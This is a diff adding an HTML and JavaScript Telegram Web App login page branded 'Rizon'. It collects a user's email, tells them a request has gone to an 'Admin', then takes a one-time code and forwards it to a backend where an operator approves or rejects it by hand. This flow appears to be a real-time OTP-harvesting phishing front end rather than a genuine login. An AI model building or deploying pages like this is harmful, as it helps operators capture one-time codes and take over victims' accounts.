@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Rizon - Login</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg-color: #000; --bg-light: #F2F2F7; --text-white: #FFF; --text-black: #000; --border-color: #E5E5EA; --yellow: #FFD700; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { background-color: var(--bg-color); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: white; }
+        #app { width: 100%; max-width: 414px; height: 100vh; background-color: var(--bg-color); position: relative; overflow: hidden; }
+        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; transition: opacity 0.3s; opacity: 0; pointer-events: none; z-index: 1; }
+        .screen.active { opacity: 1; pointer-events: auto; z-index: 10; }
+        
+        /* Login Screen Styles */
+        #login-screen { background-color: var(--bg-light); padding: 24px; color: var(--text-black); }
+        .header-nav { display: flex; align-items: center; margin-bottom: 30px; margin-top: 20px; }
+        .back-btn { font-size: 24px; cursor: pointer; width: 40px; height: 40px; display: flex; align-items: center; justify-content: center; }
+        .title-dark { font-size: 32px; font-weight: 700; margin-bottom: 8px; }
+        .subtitle-dark { font-size: 16px; color: #666; margin-bottom: 30px; }
+        
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; }
+        .input-field { width: 100%; padding: 18px; border-radius: 16px; border: 1px solid var(--border-color); font-size: 16px; outline: none; background: #fff; }
+        .input-field:focus { border-color: #000; }
+        
+        .btn { width: 100%; padding: 18px; border-radius: 30px; font-size: 16px; font-weight: 600; text-align: center; cursor: pointer; border: none; transition: 0.2s; }
+        .btn-primary { background-color: #000; color: #fff; }
+        .btn-primary:active { background-color: #333; }
+        .btn-disabled { background-color: #A1A1A6; color: #fff; cursor: not-allowed; }
+        
+        .hidden { display: none !important; }
+        .status-msg { text-align: center; margin-top: 20px; font-size: 14px; color: #666; }
+        .status-msg.error { color: #E82127; }
+        .status-msg.success { color: #34A853; }
+        
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #000; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div id="app">
+    <div id="login-screen" class="screen active">
+        <div class="header-nav">
+            <div class="back-btn" onclick="window.Telegram.WebApp.close()">←</div>
+        </div>
+        <h1 class="title-dark">Welcome back!</h1>
+        <p class="subtitle-dark">Enter your email to log in.</p>
+        
+        <div id="step-email">
+            <div class="input-group">
+                <input type="text" id="email-input" class="input-field" placeholder="example@email.com">
+            </div>
+            <button id="send-otp-btn" class="btn btn-disabled" disabled onclick="requestOTP()">Send OTP</button>
+        </div>
+
+        <div id="step-otp" class="hidden">
+            <div class="input-group">
+                <label>Enter OTP sent by Admin</label>
+                <input type="text" id="otp-input" class="input-field" placeholder="Enter OTP">
+            </div>
+            <button id="verify-otp-btn" class="btn btn-primary" onclick="verifyOTP()">Verify & Login</button>
+        </div>
+
+        <div id="status-container" class="status-msg hidden"></div>
+        <div id="loading-container" class="hidden" style="margin-top: 20px;">
+            <div class="loader"></div>
+            <p class="status-msg" style="margin-top: 10px;">Please wait...</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    
+    // Railway deployment ke baad yahan apna URL dalein (e.g., https://rizon-app.up.railway.app)
+    const API_URL = window.location.origin; 
+    
+    let currentSessionId = null;
+    let pollInterval = null;
+
+    const emailInput = document.getElementById('email-input');
+    const sendOtpBtn = document.getElementById('send-otp-btn');
+    const stepEmail = document.getElementById('step-email');
+    const stepOtp = document.getElementById('step-otp');
+    const statusContainer = document.getElementById('status-container');
+    const loadingContainer = document.getElementById('loading-container');
+
+    emailInput.addEventListener('input', function() {
+        if(this.value.trim().length > 3) {
+            sendOtpBtn.classList.remove('btn-disabled');
+            sendOtpBtn.disabled = false;
+        } else {
+            sendOtpBtn.classList.add('btn-disabled');
+            sendOtpBtn.disabled = true;
+        }
+    });
+
+    async function requestOTP() {
+        const email = emailInput.value.trim();
+        if(!email) return;
+
+        loadingContainer.classList.remove('hidden');
+        statusContainer.classList.add('hidden');
+        sendOtpBtn.classList.add('hidden');
+
+        try {
+            const response = await fetch(`${API_URL}/api/request-otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email: email })
+            });
+            const data = await response.json();
+            
+            if(data.session_id) {
+                currentSessionId = data.session_id;
+                loadingContainer.classList.add('hidden');
+                stepEmail.classList.add('hidden');
+                stepOtp.classList.remove('hidden');
+                showStatus("Request sent to Admin. Waiting for OTP...", "success");
+                startPolling();
+            } else {
+                throw new Error(data.error || "Failed to request OTP");
+            }
+        } catch (error) {
+            loadingContainer.classList.add('hidden');
+            sendOtpBtn.classList.remove('hidden');
+            showStatus(error.message, "error");
+        }
+    }
+
+    async function verifyOTP() {
+        const otp = document.getElementById('otp-input').value.trim();
+        if(!otp || !currentSessionId) return;
+
+        loadingContainer.classList.remove('hidden');
+        statusContainer.classList.add('hidden');
+
+        try {
+            await fetch(`${API_URL}/api/verify-otp`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ session_id: currentSessionId, otp: otp })
+            });
+            loadingContainer.classList.add('hidden');
+            showStatus("OTP sent to Admin. Waiting for confirmation...", "success");
+        } catch (error) {
+            loadingContainer.classList.add('hidden');
+            showStatus("Error verifying OTP. Try again.", "error");
+        }
+    }
+
+    function startPolling() {
+        if(pollInterval) clearInterval(pollInterval);
+        
+        pollInterval = setInterval(async () => {
+            if(!currentSessionId) return;
+            try {
+                const response = await fetch(`${API_URL}/api/check-status/${currentSessionId}`);
+                const data = await response.json();
+                
+                if(data.status === 'approved') {
+                    clearInterval(pollInterval);
+                    loadingContainer.classList.add('hidden');
+                    showStatus("✅ Login Successful! Welcome to Rizon.", "success");
+                    stepOtp.classList.add('hidden');
+                    setTimeout(() => tg.close(), 2000);
+                } 
+                else if(data.status === 'rejected') {
+                    clearInterval(pollInterval);
+                    loadingContainer.classList.add('hidden');
+                    showStatus("❌ OTP is not correct. Please try again.", "error");
+                    stepOtp.classList.remove('hidden');
+                }
+                else if(data.status === 'pending_user_otp') {
+                    // Admin ne OTP set kar diya, user enter kare
+                }
+            } catch (error) {
+                console.log("Polling error", error);
+            }
+        }, 2000);
+    }
+
+    function showStatus(msg, type) {
+        statusContainer.textContent = msg;
+        statusContainer.className = `status-msg ${type}`;
+        statusContainer.classList.remove('hidden');
+    }
+</script>
+</body>
+</html>
